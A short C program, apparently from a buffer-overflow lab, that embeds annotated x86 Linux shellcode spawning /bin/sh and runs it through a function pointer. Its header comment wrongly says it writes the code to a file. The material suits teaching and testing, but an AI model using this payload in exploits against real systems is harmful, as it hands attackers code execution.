/*
A program that creates a file containing code for launching shell
*/
#include <stdlib.h>
#include <stdio.h>

//const char code[] = "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd"\
       "\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f"; // Say Hello


const char code[] = \
"\x31\xc0"         /* Line 1:  xorl    %eax,%eax 	*/ 	\
"\x50"             /* Line 2:  pushl   %eax 		*/ 	\
"\x68""//sh"       /* Line 3:  pushl   $0x68732f2f 	*/ 	\
"\x68""/bin"       /* Line 4:  pushl   $0x6e69622f 	*/ 	\
"\x89\xe3"         /* Line 5:  movl    %esp,%ebx 	*/  	\
"\x50"             /* Line 6:  pushl   %eax 		*/ 	\
"\x53"             /* Line 7:  pushl   %ebx 		*/	\
"\x89\xe1"         /* Line 8:  movl    %esp,%ecx 	*/	\
"\x99"             /* Line 9:  cdql 			*/	\
"\xb0\x0b"         /* Line 10: movb    $0x0b,%al 	*/	\
"\xcd\x80"         /* Line 11: int     $0x80 		*/	\
;

int main(int argc, char	** argv)
{
  int (*func)();
  func = (int (*)()) code;
  (int)(*func)();

  return 0;
}
